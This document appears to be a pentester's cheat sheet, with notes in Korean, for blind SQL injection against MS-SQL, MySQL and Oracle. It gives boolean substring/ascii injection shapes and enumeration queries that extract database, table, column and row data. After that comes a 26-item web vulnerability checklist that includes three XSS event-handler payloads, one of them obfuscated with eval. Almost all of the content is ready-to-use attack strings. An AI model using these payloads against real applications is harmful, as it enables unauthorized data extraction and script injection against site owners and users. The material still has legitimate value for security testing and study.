# [MS-SQL]  
* Shape  
``` sql
OO' and substring((query), 1, 1) < 'a'--  
```  

* get DB NAME  
``` sql
db_name()  
```
  
* Get Table name  
``` sql
select top 1 name from sysobjects where xtype='U'  
```

* Get Column name  
``` sql
select top 1 column_name from information_schema.columns where table_name = '[Table Name]'  
```
  
* Get Data  
``` sql
select top 1 [Column Name] from [Table Name]  
```
  
# [MySQL]  
* Shape  
``` sql
???' and ascii(substr((query), 1, 1)) > 'a'#  
```  

* Get Table Name
``` sql
select table_name from information_schema.tables where table_type='base table' limit 0,1  
                                                                                     ㄴ> 0번 째 테이블  
```
  
# [Oracle]   
* Shape   
``` sql
and (ascii(SUBSTR(query),1,1))) > 1--  
```
  
* Get DB name   
``` sql
select DISTINCT owner FROM all_tables;  
```
  
* Get Table name   
``` sql
select table_name from all_tables;  
```
  
* Get Column name   
``` sql
select column_name from all_tab_columns where table_name='[table name]';
```

-----------------------------------------------------------------------------------
Row 갯수 파악

Limit 기능
``` sql
select * from (select rownum rnum, users.* from users) A where A.rnum between 1 and 3  
```

-----------------------------------------------------------------------------------
1. 관리자페이지 접근통제 및 계정관리
2. 사용자 접근통제 및 로그관리
3. 사용자 비밀번호 관리
4. 비인가 페이지 접근
5. 파라미터 변조 취약점
6. 암호화
7. 소스코드 속
8. 검색엔진 robot
9. HTTP Method
10. Direcory Listing
11. 취약한 세션 및 쿠키 인증
12. Buffer Overflow
13. Format String
14. 시스템 명령어 실행 취약점
15. 파일 다운로드 
16. 파일 업로드
17. 파일 Include
18. 악성 스크립트 XSS, CSRF  
`<img src="#" onmouseover="alert(1);">`  
`<img src="#" onerror="alert(1);">`  
`<img onclick='var a="aler"+"t(al"+"ert"+"(1));";eval(a);'>`  
19. 악성 콘텐츠 html
20. 웹페이지 오류정보 처리
21. 웹서버 백업파일 관리
22. 취약한 게시판 프로그램, 웹어플리케이션
23. SQL Injection
24. SSI Injection
25. XML 취약점
26. LDAP Injection
